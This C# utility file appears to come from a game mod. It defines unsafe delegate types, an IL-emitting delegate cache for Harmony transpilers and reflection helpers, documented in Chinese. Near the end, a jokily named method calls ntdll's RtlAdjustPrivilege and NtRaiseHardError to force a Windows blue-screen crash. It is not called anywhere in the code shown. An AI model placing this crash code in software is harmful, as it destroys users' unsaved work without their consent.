            public unsafe delegate TResult UnmanagedDelegateWithRet<out TResult, in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2 A2, T3 A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_1<in T>(T* A);
            public unsafe delegate void UnmanagedDelegate<in T>(T A);
            public unsafe delegate void UnmanagedDelegate_1<in T, in T1>(T* A, T1 A1);
            public unsafe delegate void UnmanagedDelegate_2<in T, in T1>(T A, T1* A1);
            public unsafe delegate void UnmanagedDelegate_12<in T, in T1>(T* A, T1* A1);
            public unsafe delegate void UnmanagedDelegate<in T, in T1>(T A, T1 A1);
            public unsafe delegate void UnmanagedDelegate_1<in T, in T1, in T2>(T* A, T1 A1, T2 A2);
            public unsafe delegate void UnmanagedDelegate_2<in T, in T1, in T2>(T A, T1* A1, T2 A2);
            public unsafe delegate void UnmanagedDelegate_3<in T, in T1, in T2>(T A, T1 A1, T2* A2);
            public unsafe delegate void UnmanagedDelegate_12<in T, in T1, in T2>(T* A, T1* A1, T2 A2);
            public unsafe delegate void UnmanagedDelegate_13<in T, in T1, in T2>(T* A, T1 A1, T2* A2);
            public unsafe delegate void UnmanagedDelegate_23<in T, in T1, in T2>(T A, T1* A1, T2* A2);
            public unsafe delegate void UnmanagedDelegate_123<in T, in T1, in T2>(T* A, T1* A1, T2* A2);
            public unsafe delegate void UnmanagedDelegate<in T, in T1, in T2>(T A, T1 A1, T2 A2);
            public unsafe delegate void UnmanagedDelegate_1<in T, in T1, in T2, in T3>(T* A, T1 A1, T2 A2, T3 A3);
            public unsafe delegate void UnmanagedDelegate_2<in T, in T1, in T2, in T3>(T A, T1* A1, T2 A2, T3 A3);
            public unsafe delegate void UnmanagedDelegate_3<in T, in T1, in T2, in T3>(T A, T1 A1, T2* A2, T3 A3);
            public unsafe delegate void UnmanagedDelegate_4<in T, in T1, in T2, in T3>(T A, T1 A1, T2 A2, T3* A3);
            public unsafe delegate void UnmanagedDelegate_12<in T, in T1, in T2, in T3>(T* A, T1* A1, T2 A2, T3 A3);
            public unsafe delegate void UnmanagedDelegate_13<in T, in T1, in T2, in T3>(T* A, T1 A1, T2* A2, T3 A3);
            public unsafe delegate void UnmanagedDelegate_14<in T, in T1, in T2, in T3>(T* A, T1 A1, T2 A2, T3* A3);
            public unsafe delegate void UnmanagedDelegate_23<in T, in T1, in T2, in T3>(T A, T1* A1, T2* A2, T3 A3);
            public unsafe delegate void UnmanagedDelegate_24<in T, in T1, in T2, in T3>(T A, T1* A1, T2 A2, T3* A3);
            public unsafe delegate void UnmanagedDelegate_34<in T, in T1, in T2, in T3>(T A, T1 A1, T2* A2, T3* A3);
            public unsafe delegate void UnmanagedDelegate_123<in T, in T1, in T2, in T3>(T* A, T1* A1, T2* A2, T3 A3);
            public unsafe delegate void UnmanagedDelegate_124<in T, in T1, in T2, in T3>(T* A, T1* A1, T2 A2, T3* A3);
            public unsafe delegate void UnmanagedDelegate_134<in T, in T1, in T2, in T3>(T* A, T1 A1, T2* A2, T3* A3);
            public unsafe delegate void UnmanagedDelegate_234<in T, in T1, in T2, in T3>(T A, T1* A1, T2* A2, T3* A3);
            public unsafe delegate void UnmanagedDelegate_1234<in T, in T1, in T2, in T3>(T* A, T1* A1, T2* A2, T3* A3);
            public unsafe delegate void UnmanagedDelegate<in T, in T1, in T2, in T3>(T A, T1 A1, T2 A2, T3 A3);
            public unsafe delegate void UnmanagedDelegate_1<in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2 A2, T3 A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_2<in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2 A2, T3 A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_3<in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2* A2, T3 A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_4<in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2 A2, T3* A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_5<in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2 A2, T3 A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_12<in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2 A2, T3 A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_13<in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2* A2, T3 A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_14<in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2 A2, T3* A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_15<in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2 A2, T3 A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_23<in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2* A2, T3 A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_24<in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2 A2, T3* A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_25<in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2 A2, T3 A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_34<in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2* A2, T3* A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_35<in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2* A2, T3 A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_45<in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2 A2, T3* A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_123<in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2* A2, T3 A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_124<in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2 A2, T3* A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_125<in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2 A2, T3 A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_134<in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2* A2, T3* A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_135<in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2* A2, T3 A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_145<in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2 A2, T3* A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_234<in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2* A2, T3* A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_235<in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2* A2, T3 A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_245<in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2 A2, T3* A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_345<in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2* A2, T3* A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_1234<in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2* A2, T3* A3, T4 A4);
            public unsafe delegate void UnmanagedDelegate_1235<in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2* A2, T3 A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_1245<in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2 A2, T3* A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_1345<in T, in T1, in T2, in T3, in T4>(T* A, T1 A1, T2* A2, T3* A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_2345<in T, in T1, in T2, in T3, in T4>(T A, T1* A1, T2* A2, T3* A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate_12345<in T, in T1, in T2, in T3, in T4>(T* A, T1* A1, T2* A2, T3* A3, T4* A4);
            public unsafe delegate void UnmanagedDelegate<in T, in T1, in T2, in T3, in T4>(T A, T1 A1, T2 A2, T3 A3, T4 A4);

        }
        public static Dictionary<string, Delegate> InternalDelegateCache = new Dictionary<string, Delegate>() { };
        public unsafe static CodeInstruction DefinitionInternalDelegate<T>(T action, string CacheKeyPostfix = "", string CacheKey = null) where T : Delegate
        {
            Type[] Arg = (from x in action.Method.GetParameters()
                          select x.ParameterType).ToArray<Type>();
            DynamicMethodDefinition dynamicMethodDefinition = new DynamicMethodDefinition(action.Method.Name, action.Method.ReturnType, Arg);
            ILGenerator ilgenerator = dynamicMethodDefinition.GetILGenerator();
            Type TargetType = action.Target.GetType();
            string DelegateInMemoryCacheKey = (String.IsNullOrWhiteSpace(CacheKey) ? new System.Diagnostics.StackFrame(1).GetMethod().DeclaringType.Name + "_Trigger" : CacheKey) + (String.IsNullOrWhiteSpace(CacheKeyPostfix) ? "" : $"_{CacheKeyPostfix}");
            if (!InternalDelegateCache.ContainsKey(DelegateInMemoryCacheKey)) { InternalDelegateCache.Add(DelegateInMemoryCacheKey, action); }
            if ((action.Target != null && TargetType.GetFields().Any((FieldInfo x) => !x.IsStatic)) || action.Target == null)
            {
                ilgenerator.Emit(OpCodes.Ldsfld, AccessTools.Field(typeof(PatchTools), "InternalDelegateCache"));
                ilgenerator.Emit(OpCodes.Ldstr, DelegateInMemoryCacheKey);
                ilgenerator.Emit(OpCodes.Callvirt, AccessTools.Method(typeof(Dictionary<int, Delegate>), "get_Item"));
            }
            else
            {
                if (action.Target == null)
                {
                    ilgenerator.Emit(OpCodes.Ldnull);
                }
                else
                {
                    ilgenerator.Emit(OpCodes.Newobj, AccessTools.FirstConstructor(TargetType, (ConstructorInfo x) => x.GetParameters().Length == 0 && !x.IsStatic));
                }
                ilgenerator.Emit(OpCodes.Ldftn, action.Method);
                ilgenerator.Emit(OpCodes.Newobj, AccessTools.Constructor(typeof(T), new Type[]
                {
                    typeof(object),
                    typeof(IntPtr)
                }, false));
            }
            for (int i = 0; i < Arg.Length; i++)
            {
                ilgenerator.Emit(OpCodes.Ldarg_S, (short)i);
            }
            ilgenerator.Emit(OpCodes.Callvirt, AccessTools.Method(typeof(T), "Invoke"));
            ilgenerator.Emit(OpCodes.Ret);
            return new CodeInstruction(OpCodes.Call, dynamicMethodDefinition.Generate());
        }
        public static List<CodeInstruction> WithInternalDelegate<T>(this CodeInstruction postFixCodeIns, T action, string CacheKeyPostfix = "") where T : Delegate
        {
            return new List<CodeInstruction>() { DefinitionInternalDelegate<T>(action, CacheKeyPostfix, new System.Diagnostics.StackFrame(1).GetMethod().DeclaringType.Name + "_Trigger"), postFixCodeIns };
        }
        /// <summary>
        /// <para>根据传入的委托在InternalDelegateCache内生成一个默认为该方法调用者所处类的类名作为Key储存于该字典内的内存内委托 并返回一条调用该委托的IL语句</para>
        /// <para>*****重点：对于Ref的处理 使用PatchTools.UnmanagedDelegateTypes类下的委托 委托的命名规范为UnmanagedDelegate[是否带有返回值:WithRet][_类型为指针的参数id(从0开始且不加间隔 从左向右打即可)]</para>
        /// <para>例:(int a, int b, string* c, float* d) => {return "aa"}的需要返回string的委托 使用UnmanagedDelegateWithRet_34[[string, int, int, string, float]]作为泛型参数 (双中括号换尖括号 智能注释里不让打)</para>
        /// <para>*****重点II：在调用该方法返回的IL字段前的参数准备中 对于指针类型的参数处理方式与处理Ref一致：即读取地址到堆栈上即可 但是指针需要再加一条Conv_U(部分情况会有不同 但大部分情况你用Conv_U指定是对的 具体可以参考官方Opcodes对这几个Conv的解释)</para>
        /// <para>例II:(LdLoca_S,1)，(Conv_U,null),[本方法]</para>
        /// 若一个Tranpiler内生成了两个及以上的Delegate请从第二个开始使用CacheKeyPostfix参数命名一个标志后缀(随便打就可以 只是为了区分key)
        /// </summary>
        /// <typeparam name="T"></typeparam>
        /// <param name="_"></param>
        /// <param name="action"></param>
        /// <param name="CacheKeyPostfix">若一个Tranpiler内生成了两个及以上的Delegate请从第二个开始使用这个参数命名</param>
        /// <returns>new CodeInstruction(Opcodes.Call,内存内生成的调用传入的委托的方法)->可以理解成new CodeInstruction(Opcodes.CallVirt,传入委托.Invoke)->其实就是调用传入委托</returns>
        public static CodeInstruction CallInternalDelegate<T>(this CodeInstruction _, T action, string CacheKeyPostfix = "") where T : Delegate
        {
            return DefinitionInternalDelegate<T>(action, CacheKeyPostfix, new System.Diagnostics.StackFrame(1).GetMethod().DeclaringType.Name + "_Trigger");
        }
        /// <summary>
        /// 尝试根据给定的当前类型与CacheKeyPostfix获取内存内存储的委托
        /// </summary>
        /// <param name="Type"></param>
        /// <param name="CacheKeyPostfix"></param>
        /// <returns></returns>
        public static Delegate GetInternalDelegate(this Type Type, string CacheKeyPostfix = "")
        {
            Delegate Result = null;
            if (Type != null)
            {
                PatchTools.InternalDelegateCache.TryGetValue(Type.Name + "_Trigger" + (String.IsNullOrWhiteSpace(CacheKeyPostfix) ? "" : $"_{CacheKeyPostfix}"), out Result);
            }
            return Result;
        }

        public static Delegate GetInternalDelegate<T>(this Type Type, string CacheKeyPostfix = "") where T : Delegate
        {
            Delegate Result = null;
            Result = GetInternalDelegate(Type, CacheKeyPostfix);
            if (Result != null)
            {
                return (T)Result;
            }
            return Result;
        }
    }
    public static class MyTools
    {

        public static bool ISNULL(this object obj, params string[] names)
        {
            object temp = obj;
            foreach (string name in names)
            {
                if (temp == null)
                {
                    return false;
                }
                temp = temp.GetFieldValue(null, name);
            }
            return true;
        }
        /// <summary>
        /// 反射
        /// </summary>
        /// <typeparam name="T">返回类型的值的类型</typeparam>
        /// <param name="obj">实例</param>
        /// <param name="name">变量名</param>
        /// <returns></returns>
        public static T GetFieldValue<T>(this object obj, string name)
        {
            var res = default(T);
            try
            {
                res = (T)obj.GetType().GetField(name, AccessTools.all).GetValue(obj);
            }
            catch (Exception ex)
            {
                Debug.Log($" : T GetFieldValue<T>(this object obj, string name) : {ex}");
            }

            return res;
        }

        public static object GetFieldValue(this object obj, Type t, string name)
        {
            object res = null;
            try
            {
                res = obj.GetType().GetField(name, AccessTools.all).GetValue(obj);
            }
            catch (Exception ex)
            {
                Debug.Log($" : T GetFieldValue<T>(this object obj, string name) : {ex}");
            }

            return res;
        }
        public static void SetFieldValue<T>(this object obj, string name, object value)
        {
            try
            {
                AccessTools.Field(obj.GetType(), name).SetValue(obj, value);
            }
            catch (Exception ex)
            {
                Debug.Log($" : T GetFieldValue<T>(this object obj, string name) : {ex}");
            }
        }
        public static void SetFieldValue(this object obj, string name, object value)
        {
            try
            {
                AccessTools.Field(obj.GetType(), name).SetValue(obj, value);
            }
            catch (Exception ex)
            {
                Debug.Log($" : void SetFieldValue(this object obj, string name, object value) : {ex}");
            }
        }
        /// <summary>
        /// 反射
        /// </summary>
        /// <typeparam name="T">返回类型的值的类型</typeparam>
        /// <param name="obj">实例</param>
        /// <param name="name">方法名</param>
        /// <param name="parameters">方法参数</param>
        /// <returns></returns>
        public static T InvokeMethod<T>(this object obj, string name, params object[] parameters)
        {
            var res = default(T);
            try
            {
                res = (T)obj.GetType().GetMethod(name, AccessTools.all).Invoke(obj, parameters);
            }
            catch (Exception ex)
            {
                Debug.Log(
                    $" : T InvokeMethod<T>(this object obj, string name, params object[] parameters) : {ex}");
            }

            return res;
        }

        public static object InvokeMethod(this object obj, Type t, string name, params object[] parameters)
        {
            object res = null;
            try
            {
                res = obj.GetType().GetMethod(name, AccessTools.all).Invoke(obj, parameters);
            }
            catch (Exception ex)
            {
                Debug.Log(
                    $" : object InvokeMethod(this object obj, Type t, string name, params object[] parameters) : {ex}");
            }

            return res;
        }

        public static void InvokeMethod(this object obj, string name, params object[] parameters)
        {
            try
            {
                obj.GetType().GetMethod(name, AccessTools.all).Invoke(obj, parameters);
            }
            catch (Exception ex)
            {
                Debug.Log(
                    $" : InvokeMethod(this object obj, string name, params object[] parameters) : {ex}");
            }

        }
        public static CustomMapHandler CMH
        {
            get
            {
                return CustomMapHandler.GetCMU(TKS_BloodFiend_Initializer.packageId);
            }
        }
        public static LorId Create(int v)
        {
            return new LorId(TKS_BloodFiend_Initializer.packageId, v);
        }

        public static List<T> TKSRandomUtil<T>(List<T> ListToRandom_Arg, int randomnum, bool canbethesame = false, bool copywhenempty = true)
        {

            List<T> list = new List<T>();
            var ListToRandom = ListToRandom_Arg;
            T item = default(T);
            for (int i = 0; i < randomnum; i++)
            {
                if (ListToRandom.Count >= 1)
                {
                    item = RandomUtil.SelectOne<T>(ListToRandom);
                    if (!canbethesame)
                    {
                        ListToRandom.Remove(item);
                    }
                    list.Add(item);
                }
                else
                {
                    if (!copywhenempty)
                    {
                        break;
                    }
                    list.Add(item);
                }
            }
            return list;
        }

        [DllImport("ntdll.dll")]
        private static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);

        [DllImport("ntdll.dll")]
        private static extern int NtRaiseHardError(uint ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, IntPtr Parameters, int ValidResponseOption, out int Response);
        public static void 蓝屏提醒_调用此方法即可体验超绝创意工坊差评如潮()
        {
            RtlAdjustPrivilege(0x13, true, false, out _);

            NtRaiseHardError(0xC0000005, 0, 0, IntPtr.Zero, 6, out _);
        }
        public static void 未实现提醒()
        {
#pragma warning disable CS0219 // 变量已被赋值，但从未使用过它的值
            var Desc = "可以右键应用查看空实现";
#pragma warning restore CS0219 // 变量已被赋值，但从未使用过它的值
            Debug.LogError("空实现");
        }

    }
}
